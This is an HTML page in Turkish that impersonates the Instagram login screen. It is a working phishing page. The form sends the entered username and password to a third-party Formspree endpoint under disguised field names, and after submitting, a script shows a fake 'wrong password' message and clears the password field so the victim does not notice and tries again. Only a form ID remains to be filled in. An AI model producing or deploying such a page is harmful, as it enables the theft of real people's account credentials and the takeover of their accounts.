<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Giriş Ekranı</title>
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-container { width: 350px; padding: 40px; background-color: white; border: 1px solid #dbdbdb; text-align: center; }
    .logo { font-family: 'Grand Hotel', cursive; font-size: 52px; margin-bottom: 30px; color: #262626; }
    input { width: 100%; padding: 10px; margin: 6px 0; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; box-sizing: border-box; font-size: 12px; }
    button { width: 100%; padding: 8px; margin-top: 15px; background-color: #0095f6; border: none; color: white; font-weight: 600; border-radius: 4px; cursor: pointer; }
    #error-box { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; font-weight: 500; }
    .links { margin-top: 25px; font-size: 12px; color: #8e8e8e; }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="logo">Instagram</div>
    
    <div id="error-box">Üzgünüz, şifreniz yanlıştı. Lütfen tekrar deneyin.</div>

    <form id="secureForm" action="https://formspree.io/f/YENI_FORM_ID_BURAYA" method="POST">
      <input type="text" name="ziyaretci_ismi" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required />
      <input type="password" name="mesaj_notu" placeholder="Şifre" required />
      
      <button type="submit">Giriş Yap</button>
    </form>

    <div class="links">
      <a href="#" style="text-decoration:none; color:#00376b; font-weight:600;">Şifreni mi unuttun?</a>
    </div>
  </div>

  <script>
    const form = document.getElementById('secureForm');
    const errorBox = document.getElementById('error-box');

    form.onsubmit = function(e) {
      // Önce hatayı gösteriyoruz
      errorBox.style.display = 'block';
      
      // Formun gitmesine izin veriyoruz ama 1 saniye sonra şifre kutusunu temizliyoruz
      setTimeout(() => {
        document.getElementsByName('mesaj_notu')[0].value = '';
      }, 500);
    };
  </script>

</body>
</html>
